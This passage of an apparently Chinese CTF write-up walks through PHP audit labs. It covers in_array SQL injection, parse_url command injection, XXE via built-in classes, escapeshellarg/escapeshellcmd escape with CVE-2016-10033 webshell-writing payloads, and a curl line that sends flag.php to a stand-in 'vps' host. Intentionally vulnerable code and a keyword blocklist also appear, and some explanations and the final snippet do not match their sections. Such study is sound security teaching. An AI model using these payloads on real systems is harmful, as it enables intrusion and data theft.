<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;
    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_assoc();
    <span class="hljs-variable">$whitelist</span> = range(<span class="hljs-number">1</span>, <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;COUNT(*)&#x27;</span>]);
&#125;

<span class="hljs-variable">$id</span> = stop_hack(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);
<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span>&quot;</span>;

<span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$id</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;id <span class="hljs-subst">$id</span> is not in whitelist.&quot;</span>);
&#125;

<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;
    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_assoc();
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$row</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;
    &#125;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;
&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$conn</span>-&gt;error);
&#125;

<span class="hljs-meta">?&gt;</span>
</code></pre></div>



<p><strong>漏洞解析</strong> ：</p>
<p>这一关卡考察的是一个任意文件上传漏洞，而导致这一漏洞的发生则是不安全的使用 <strong>in_array()</strong> 函数来检测上传的文件名，即上图中的第12行部分。由于该函数并未将第三个参数设置为 <strong>true</strong> ，这导致攻击者可以通过构造的文件名来绕过服务端的检测，例如文件名为 <strong>7shell.php</strong> 。因为PHP在使用 <strong>in_array()</strong> 函数判断时，会将 <strong>7shell.php</strong> 强制转换成数字7，而数字7在 <strong>range(1,24)</strong> 数组中，最终绕过 <strong>in_array()</strong> 函数判断，导致任意文件上传漏洞。</p>
<p><strong style="color:orange;">in_array()</strong></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320210651995.png" srcset="/img/loading.gif" alt="image-20210320210651995" style="zoom: 67%;">

<p>漏洞利用的例题如下</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-comment">//index.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>;
<span class="hljs-variable">$conn</span> = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$conn</span>-&gt;connect_error) &#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;连接失败: &quot;</span>);
&#125;

<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT COUNT(*) FROM users&quot;</span>;
<span class="hljs-variable">$whitelist</span> = <span class="hljs-keyword">array</span>();
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;
    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_assoc();
    <span class="hljs-variable">$whitelist</span> = range(<span class="hljs-number">1</span>, <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;COUNT(*)&#x27;</span>]);
&#125;
<span class="hljs-variable">$id</span> = stop_hack(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);
<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-subst">$id</span>&quot;</span>;
<span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$id</span>, <span class="hljs-variable">$whitelist</span>)) &#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;id <span class="hljs-subst">$id</span> is not in whitelist.&quot;</span>);
&#125;
<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$sql</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;
    <span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;fetch_assoc();
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>;
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$row</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;tr&gt;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$key</span>&lt;/center&gt;&lt;/td&gt;&lt;br&gt;&quot;</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;td&gt;&lt;center&gt;<span class="hljs-subst">$value</span>&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;br&gt;&quot;</span>;
    &#125;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/table&gt;&lt;/center&gt;&quot;</span>;
&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">die</span>(<span class="hljs-variable">$conn</span>-&gt;error);
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>



<div class="hljs"><pre><code class="hljs php"><span class="hljs-comment">//config.php</span>
<span class="hljs-meta">&lt;?php</span>  
<span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;
<span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;fire&quot;</span>;
<span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;fire&quot;</span>;
<span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;day1&quot;</span>;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">stop_hack</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;
    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;insert|delete|or|concat|concat_ws|group_concat|join|floor|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|dumpfile|sub|hex|file_put_contents|fwrite|curl|system|eval&quot;</span>;
    <span class="hljs-variable">$back_list</span> = explode(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-variable">$pattern</span>);
    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$back_list</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$hack</span>)&#123;
        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/<span class="hljs-subst">$hack</span>/i&quot;</span>, <span class="hljs-variable">$value</span>))
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$hack</span> detected!&quot;</span>);
    &#125;
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>可以看到网页的功能很简单，就是输入用户id，然后服务器返回用户的信息，但是对id参数使用in_array()函数进行了检查，但是我们可以利用上面提到的漏洞，只要payload的第一个字符在range(1,count(*))的范围之内即可绕过第检查。绕过效果如下</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320214443192.png" srcset="/img/loading.gif" alt="image-20210320214443192" style="zoom:67%;">

<p>但是有一个stop_hack函数，其过滤了很多sql注入中常用的关键词，导致了很多方法无法使用，其中or被过滤就很麻烦，information_schema中包含or单词，所以常规的注入方法无法使用。</p>
<p>这里可以使用报错注入，使用 make_set()函数实现报错注入。</p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320215543202.png" srcset="/img/loading.gif" alt="image-20210320215543202" style="zoom:67%;">

<div class="hljs"><pre><code class="hljs reasonml">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,make<span class="hljs-constructor">_set(7,0x7e,(<span class="hljs-params">select</span> <span class="hljs-params">user</span>()</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)</code></pre></div>

<p>表名，列名无法使用information_shcema，但是如果是为了获取flag的话，可以猜测是在flag表的flag列</p>
<p>最后获取flag的payload</p>
<div class="hljs"><pre><code class="hljs reasonml">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,make<span class="hljs-constructor">_set(7,0x7e,(<span class="hljs-params">select</span> <span class="hljs-params">flag</span> <span class="hljs-params">from</span> <span class="hljs-params">flag</span>)</span>,<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)</code></pre></div>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320220057808.png" srcset="/img/loading.gif" alt="image-20210320220057808" style="zoom:50%;">





<h2 id="2-filter-var函数缺陷"><a href="#2-filter-var函数缺陷" class="headerlink" title="2.filter_var函数缺陷"></a>2.filter_var函数缺陷</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$url</span>) &amp;&amp; filter_var(<span class="hljs-variable">$url</span>, FILTER_VALIDATE_URL))&#123;
    <span class="hljs-variable">$site_info</span> = parse_url(<span class="hljs-variable">$url</span>);
    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/sec-redclub.com$/&#x27;</span>,<span class="hljs-variable">$site_info</span>[<span class="hljs-string">&#x27;host&#x27;</span>]))&#123;
        exec(<span class="hljs-string">&#x27;curl &quot;&#x27;</span>.<span class="hljs-variable">$site_info</span>[<span class="hljs-string">&#x27;host&#x27;</span>].<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-variable">$result</span>);
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;You have curl <span class="hljs-subst">&#123;$site_info[&#x27;host&#x27;]&#125;</span> successfully!&lt;/h1&gt;&lt;/center&gt;</span>
<span class="hljs-string">              &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;</span>;
        <span class="hljs-keyword">echo</span> implode(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-variable">$result</span>);
    &#125;
    <span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);
    &#125;

&#125;
<span class="hljs-keyword">else</span>&#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span>
<span class="hljs-string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;
&#125;

<span class="hljs-meta">?&gt;</span>
</code></pre></div>



<p><strong style="color:orange;">filter_var</strong></p>
<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320222243276.png" srcset="/img/loading.gif" alt="image-20210320222243276" style="zoom:50%;">

<p><strong>代码审计</strong></p>
<p>输入的网址首先经过 filter_var()判断是否符合 uri 格式要求，然后用 parse_url()</p>
<p>提取出其中的 host 部分，拼接到 exec()函数里，而 url 是可控的，明显思路是要利用</p>
<p>exec()来命令执行。</p>
<p>可以使用如下 payload 进入命令执行，引号用来闭合 curl 后面的引号，分号则用来闭</p>
<p>合命令，从而执行 ls 命令，并且由于 parse_url()的解析问题，会把第一个分号后面的</p>
<p>内容当作 host 部分，则绕过了正则匹配检查。</p>
<div class="hljs"><pre><code class="hljs awk">?url=hello:<span class="hljs-regexp">//</span><span class="hljs-string">&quot;;ls;&quot;</span>sec-redclub.com</code></pre></div>

<p>此时的<code>$site_info[host]</code>的值为<code>&quot;;dir;&quot;sec-redclub.com</code>，那么拼接后的语句 为</p>
<div class="hljs"><pre><code class="hljs powershell"><span class="hljs-built_in">curl</span> <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-built_in">dir</span>;<span class="hljs-string">&quot;sec-redclub.com&quot;</span></code></pre></div>

<p>这样当exec执行时就会执行到dir命令，所以就可以列出目录</p>
<p>读取flag</p>
<div class="hljs"><pre><code class="hljs awk">?url=hello:<span class="hljs-regexp">//</span><span class="hljs-string">&quot;;more$&#123;IFS&#125;;&quot;</span>sec-redclub.com</code></pre></div>



<h2 id="3-实例化任意对象漏洞"><a href="#3-实例化任意对象漏洞" class="headerlink" title="3.实例化任意对象漏洞"></a>3.实例化任意对象漏洞</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NotFound</span></span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;404&#x27;</span>);
    &#125;
&#125;
spl_autoload_register(
    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;
        <span class="hljs-keyword">new</span> NotFound();
    &#125;
);
<span class="hljs-variable">$classname</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-literal">null</span>;
<span class="hljs-variable">$param</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>] : <span class="hljs-literal">null</span>;
<span class="hljs-variable">$param2</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>] : <span class="hljs-literal">null</span>;
<span class="hljs-keyword">if</span>(class_exists(<span class="hljs-variable">$classname</span>))&#123;
    <span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$classname</span>(<span class="hljs-variable">$param</span>,<span class="hljs-variable">$param2</span>);
    var_dump(<span class="hljs-variable">$newclass</span>);
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$newclass</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;=&gt;&#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;
&#125;
</code></pre></div>

<p>这道题目考察的是实例化漏洞结合XXE漏洞。我们在上图第18行处可以看到使用了 <strong>class_exists</strong> 函数来判断类是否存在，如果不存在的话，就会调用程序中的 <strong>__autoload</strong> 函数，但是这里没有 <strong>__autoload</strong> 函数，而是用 <a target="_blank" rel="noopener" href="http://php.net/manual/en/function.spl-autoload-register.php"><strong>spl_autoload_register</strong></a> 注册了一个类似 <strong>__autoload</strong> 作用的函数，即这里输出404信息。</p>
<p>我们这里直接利用PHP的内置类，先用 <strong>GlobIterator</strong> 类搜索 <strong>flag文件</strong> 名字，来看一下PHP手册对 <strong>GlobIterator</strong> 类的 构造函数的定义：</p>
<blockquote>
<p>public <strong>GlobIterator::__construct</strong> ( string <code>$pattern</code> [, int <code>$flags</code> = FilesystemIterator::KEY_AS_PATHNAME | FilesystemIterator::CURRENT_AS_FILEINFO ] )</p>
</blockquote>
<p>首先我们需要知道 flag 在哪个文件中，在 PHP 的内置类中可以用 GlobIterator 类来遍历文件系统，其构造函数的第一个参数为要搜索的文件名，第二个参数为选择文件的哪个</p>
<p>列目录的payload:</p>
<div class="hljs"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/homework/</span>php<span class="hljs-regexp">/xxe/i</span>ndex.php?name=GlobIterator&amp;param=./*.php&amp;param2=<span class="hljs-number">0</span></code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320230302156.png" srcset="/img/loading.gif" alt="image-20210320230302156">读取flag</p>
<p><strong>方法一：</strong></p>
<p>实例化 SimpleXMLElement类来进行 XXE</p>
<div class="hljs"><pre><code class="hljs xml">?name=SimpleXMLElement&amp;param=<span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/read=convert.base64-encode/resource=/f1ag.php&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">x</span>&gt;</span>%26xxe;<span class="hljs-tag">&lt;/<span class="hljs-name">x</span>&gt;</span>&amp;param2=2</code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320230727404.png" srcset="/img/loading.gif" alt="image-20210320230727404"></p>
<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320230746924.png" srcset="/img/loading.gif" alt="image-20210320230746924"></p>
<p><strong>方法二:</strong></p>
<p>使用 SplFileObject 类直接读取文件</p>
<p>payload</p>
<div class="hljs"><pre><code class="hljs sqf">?<span class="hljs-built_in">name</span>=SplFileObject&amp;<span class="hljs-built_in">param</span>=./<span class="hljs-built_in">flag</span>.php&amp;param2=r</code></pre></div>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210320231130526.png" srcset="/img/loading.gif" alt="image-20210320231130526"></p>
<h2 id="4-escapeshellarg与escapeshellcmd使用不当"><a href="#4-escapeshellarg与escapeshellcmd使用不当" class="headerlink" title="4.escapeshellarg与escapeshellcmd使用不当"></a>4.escapeshellarg与escapeshellcmd使用不当</h2><p>主体上就是一个过滤了后的mail函数执行。<br>mail函数的参数是这样的</p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">bool</span> mail (
	<span class="hljs-keyword">string</span> <span class="hljs-variable">$to</span> ,
	<span class="hljs-keyword">string</span> <span class="hljs-variable">$subject</span> ,
	<span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> [,
	<span class="hljs-keyword">string</span> <span class="hljs-variable">$additional_headers</span> [,
	<span class="hljs-keyword">string</span> <span class="hljs-variable">$additional_parameters</span> ]]
)</code></pre></div>

<p>由于默认调用的是linux的sendmail函数，所以可以在<code>message</code>中写入恶意代码。接着由additional_parameters 指定额外参数，从而写入在指定目录写入文件。</p>
<p>但是，php的mail函数也在底层默认执行了一层<code>escapeshellcmd()</code>函数，那么显然转义了我们的恶意代码。<br>不过，本题代码还有一处经典的<code>escapeshellarg()</code>。如果<code>escapeshellarg()</code>+<code>escapeshellcmd()</code>搭配使用，将出现特殊字符逃逸的问题。<br>buu上也有一个类似的题目.这里则借用项目里的例子简单介绍下</p>
<div class="hljs"><pre><code class="hljs routeros">127.0.0.1<span class="hljs-string">&#x27; -v -d a=1</span>
<span class="hljs-string">#escapeshellarg</span>
<span class="hljs-string">&#x27;</span>127.0.0.1<span class="hljs-string">&#x27;\&#x27;</span><span class="hljs-string">&#x27; -v -d a=1&#x27;</span>
<span class="hljs-comment">#escapeshellcmd</span>
<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span> -v -d <span class="hljs-attribute">a</span>=1\&#x27;</code></pre></div>

<p>此时最后一步可以看出，<code>\\</code>将被解释为<code>\</code>不再起到转义的作用，而是作为换行符。因此payload变为先是<code>127.0.0.1</code>，再<code>-v -d</code>-d对应的数据为<code>a=1&#39;</code>.</p>
<p>比如CVE-2016-10033 跟CVE-2016-10045的两个payload</p>
<div class="hljs"><pre><code class="hljs awk">a( -OQueueDirectory=<span class="hljs-regexp">/tmp -X/</span>var<span class="hljs-regexp">/www/</span>html/x.php )@a.com

a<span class="hljs-string">&#x27;( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span></code></pre></div>

<p>前者没有escapeshellcmd直接打。后者escapeshellcmd后又加了一层escapeshellarg导致字符逃逸。</p>
<p>源码如下，对其进行了注释</p>
<div class="hljs"><pre><code class="hljs php+HTML">&lt;?php
highlight_file(&#39;index.php&#39;);
function waf($a)&#123;
    foreach($a as $key &#x3D;&gt; $value)&#123;
        if(preg_match(&#39;&#x2F;flag&#x2F;i&#39;,$key))&#123;&#x2F;&#x2F;遍历所有键，不能出现flag字样
            exit(&#39;are you a hacker&#39;);
        &#125;
    &#125;
&#125;
foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;&#x2F;&#x2F;遍历所有以post，get，cookie方式提交的数据，
    if($$__R) &#123; &#x2F;&#x2F;例如$flag&#x3D;a,$$flag--&gt;$a,一个新变量
        foreach($$__R as $__k &#x3D;&gt; $__v) &#123; 
            if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); &#x2F;&#x2F;若之前有这个变量并且键和值相等，就删除这个变量
        &#125;
    &#125;

&#125;
if($_POST) &#123; waf($_POST);&#125;
if($_GET) &#123; waf($_GET); &#125;
if($_COOKIE) &#123; waf($_COOKIE);&#125;

if($_POST) extract($_POST, EXTR_SKIP);&#x2F;&#x2F;将键名变成变量名，如果传入flag，应该是设置了_GET[&#39;flag&#39;]这个变量
if($_GET) extract($_GET, EXTR_SKIP);
if(isset($_GET[&#39;flag&#39;]))&#123;&#x2F;&#x2F;必须设置以get方式传参的flag..这个可以用
    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;hongri&#39;])&#123;
        exit(&#39;error&#39;);
    &#125;
    if(md5($_GET[&#39;flag&#39;] ) &#x3D;&#x3D; md5($_GET[&#39;hongri&#39;]))&#123;&#x2F;&#x2F;数组或碰撞
		echo &quot;success!&quot;;
	   $url &#x3D; $_GET[&#39;url&#39;];
        $urlInfo &#x3D; parse_url($url);
        if(!(&quot;http&quot; &#x3D;&#x3D;&#x3D; strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;&#x3D;&#x3D;&#x3D;strtolower($urlInfo[&quot;scheme&quot;])))&#123;
            die( &quot;scheme error!&quot;);
        &#125;
        $url &#x3D; escapeshellarg($url);
        $url &#x3D; escapeshellcmd($url);&#x2F;&#x2F;特殊字符逃逸
        system(&quot;curl &quot;.$url);
    &#125;
&#125;
?&gt;
</code></pre></div>

<p>很明显的变量覆盖，之后要绕过waf。再接下来就是escapeshellsmd/arg的搭配进行命令执行了。<br>首先要解决的是，我们必须绕过preg_match的限制才能传入flag变量。因此要利用好它写好的这个功能。</p>
<p>首先这里利用了可变变量的特性。假设我们提交</p>
<div class="hljs"><pre><code class="hljs sqf">?<span class="hljs-built_in">flag</span>=test 
post:<span class="hljs-variable">_GET</span>[<span class="hljs-built_in">flag</span>]=test</code></pre></div>

<p>当开始遍历 <code>$_POST</code> 超全局数组的时候， <code>$__k</code> 代表 _GET[flag] ，所以 <code>$$__k</code>就是 <code>$_GET[flag]</code> ，即 test 值，此时 <code>$$__k == $__v</code> 成立，变量 <code>$_GET[flag]</code> 就被 unset 了</p>
<p>而接下来下面又有一个变量覆盖<br><code>if($_POST) extract($_POST, EXTR_SKIP);</code><br>所以直接得到<code>$_GET[flag]=test</code>绕过第一层</p>
<p>第二层只需利用0e的MD5弱类型比较<br>最后是curl的命令执行<br><code>http://baidu.com/&#39; -F file=@/var/www/html/flag.php -x vps:9999</code><br>似乎当curl版本变高后，将不再能执行。<br><code>curl &#39;127.0.0.1&#39;\&#39;&#39;</code></p>
<h2 id="5-preg-match函数漏洞"><a href="#5-preg-match函数漏洞" class="headerlink" title="5.preg_match函数漏洞"></a>5.preg_match函数漏洞</h2><div class="hljs"><pre><code class="hljs php"><span class="hljs-comment">// index.php</span>
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;
<span class="hljs-keyword">if</span>  (<span class="hljs-string">&quot;POST&quot;</span> == <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>])
&#123;
    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &gt;= preg_match(<span class="hljs-string">&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;</span>, <span class="hljs-variable">$password</span>))
    &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong Format&#x27;</span>;
        <span class="hljs-keyword">exit</span>;
    &#125;
    <span class="hljs-keyword">while</span> (<span class="hljs-literal">TRUE</span>)
    &#123;
        <span class="hljs-variable">$reg</span> = <span class="hljs-string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-number">6</span> &gt; preg_match_all(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$arr</span>))
            <span class="hljs-keyword">break</span>;
        <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>;
        <span class="hljs-variable">$ps</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;punct&#x27;</span>, <span class="hljs-string">&#x27;digit&#x27;</span>, <span class="hljs-string">&#x27;upper&#x27;</span>, <span class="hljs-string">&#x27;lower&#x27;</span>);
        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$ps</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$pt</span>)
        &#123;
            <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/[[:<span class="hljs-subst">$pt</span>:]]+/&quot;</span>, <span class="hljs-variable">$password</span>))
            <span class="hljs-variable">$c</span> += <span class="hljs-number">1</span>;
        &#125;
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$c</span> &lt; <span class="hljs-number">3</span>) <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;42&quot;</span> == <span class="hljs-variable">$password</span>) <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong password&#x27;</span>;
        <span class="hljs-keyword">exit</span>;
    &#125;
&#125;
highlight_file(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>字符类的含义是</p>
<div class="hljs"><pre><code class="hljs gauss"><span class="hljs-keyword">graph</span> 空格以外的可打印字符
punct  打印字符，不包括字母数字</code></pre></div>

<p>主要函数里，第一个正则表示匹配到可打印字符12个以上;第二个正则表示把连续的符号、数字、大写、小写，作为一段，至少分六段;第三个正则表示输入的字符串至少含有符号、数字、大写、小写中的三种类型。</p>
<p>最后与数字进行弱类型比较。<br>payload</p>
<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">42</span>.<span class="hljs-number">00</span>e+<span class="hljs-number">00000</span></code></pre></div>


<p>第一种方法</p>
<div class="hljs"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1/index.php?option=a&#x27;;%0aphpinfo();//</span>
<span class="hljs-symbol">http:</span><span class="hljs-comment">//127.0.0.1/index.php?option=a</span></code></pre></div>

<p>第一个payload写入内容后只有一个单引号被转义的问题。而第二部分再传入一个a时就会因为<code>.*</code>匹配无数次而把<code>\</code>换掉</p>
